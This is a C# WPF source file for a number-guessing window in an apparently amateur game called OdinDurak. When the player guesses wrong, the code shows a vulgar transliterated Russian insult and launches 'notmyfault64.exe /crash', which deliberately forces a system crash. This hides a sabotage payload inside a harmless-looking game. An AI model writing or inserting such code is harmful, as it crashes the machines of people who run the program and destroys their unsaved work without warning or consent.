using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace OdinDurak
{
    /// <summary>
    /// Логика взаимодействия для stakes.xaml
    /// </summary>
    public partial class Stakes : Window
    {

        int correct;
        public Stakes()
        {
            InitializeComponent();

            correct = Choice();
            foreach (UIElement button in GridRoot.Children)
            {
                if (button is Button)
                {
                    ((Button)button).Click += Button_Click;
                }
            }
        }

        private static int Choice()
        {
            Random _rand = new Random();
            return _rand.Next(1, 9);
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            string s = (string)((Button)e.OriginalSource).Content;
            int input = Int32.Parse(s);
            
            if(correct == input)
            {
                MessageBox.Show("YOU WON");
                this.Close();
            }
            else
            {
                MessageBox.Show("LOVI BDOS V EBALO MATHAFACKAR");
                System.Diagnostics.Process.Start("notmyfault64.exe", "/crash");
            }
            
        }

    }
}
